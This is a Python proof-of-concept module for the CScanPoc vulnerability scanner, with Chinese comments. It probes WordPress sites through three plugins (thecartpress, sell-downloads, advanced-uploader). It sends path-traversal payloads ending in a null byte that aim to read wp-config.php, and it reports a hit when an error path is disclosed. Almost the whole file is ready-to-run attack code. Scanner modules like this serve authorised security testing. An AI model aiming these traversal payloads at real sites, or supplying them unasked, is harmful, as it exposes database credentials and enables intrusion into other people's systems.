# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0044'  # 平台漏洞编号，留空
    name = 'WordPress 配置文件信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        WordPress 配置文件信息泄露。
        /wp-content/plugins/thecartpress/modules/Miranda.class.php?page=
        /wp-content/plugins/sell-downloads/sell-downloads.php?file=
        /wp-content/plugins/advanced-uploader/upload.php?destinations=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fbce4167-349f-4e87-a7b1-0f8f60779ac5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload1 = '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00'
            payload2 = '/wp-content/plugins/sell-downloads/sell-downloads.php?file=../../../../../../../../.././wp-config.php%00'
            payload3 = '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00'
            verify_url = self.target + payload1
            code, head, res, errcode, _ = hh.http(verify_url)
            path = re.findall(r'in <b>(.+?Miranda.class.php)</b>', res)
            if len(path) != 0:
                # security_info(path[0])
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            verify_url = self.target + payload2
            code, head, res, errcode, _ = hh.http(verify_url)
            path = re.findall(r'in <b>(.+?sell-downloads.php)</b>', res)
            if len(path) != 0:
                # security_info(path[0])
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            verify_url = self.target + payload3
            code, head, res, errcode, _ = hh.http(verify_url)
            path = re.findall(r'in <b>(.+?upload.php)</b>', res)
            if len(path) != 0:
                # security_info(path[0])
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
